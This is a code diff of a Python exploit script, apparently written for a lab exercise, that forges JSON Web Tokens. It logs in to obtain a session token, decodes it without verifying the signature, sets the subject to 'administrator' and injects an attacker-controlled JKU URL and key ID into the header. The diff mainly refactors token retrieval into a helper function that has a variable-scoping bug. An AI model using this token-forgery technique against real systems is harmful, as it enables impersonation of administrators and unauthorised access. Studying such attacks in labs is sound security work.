@@ -14,21 +14,29 @@ import config
 PRIVATE_KEY = ""
 JWT_TOKEN = ""
 
+def retrieve_token():
+    response = requests.post(config.LOGIN_URL, data=config.Credentials, allow_redirects=False)
+    if response.status_code == 302:
+        JWT_TOKEN = response.cookies.get("session")
+    return JWT_TOKEN
+
+result = retrieve_token()
+print(result)
 
 def generate_modified_JWT():
 
     # 1. Authenticate and extract the session token
-    response = requests.post(config.LOGIN_URL,data=config.Credentials, allow_redirects=False)
-    if response.status_code == 302:
-        JWT_TOKEN = response.cookies.get("session")
+    # response = requests.post(config.LOGIN_URL,data=config.Credentials, allow_redirects=False)
+    # if response.status_code == 302:
+    #     JWT_TOKEN = response.cookies.get("session")
     
-
+    jwt_token = retrieve_token()
     # 2. Modify payload to impersonate admin
-    decoded_payload = jwt.decode(JWT_TOKEN, options={"verify_signature":False})
+    decoded_payload = jwt.decode(jwt_token, options={"verify_signature":False})
     decoded_payload["sub"] = "administrator"
 
 
-    decoded_header = jwt.get_unverified_header(JWT_TOKEN)
+    decoded_header = jwt.get_unverified_header(jwt_token)
 
     # 3. Inject JKU and KID into the header
     decoded_header["jku"] = config.JKU_URL
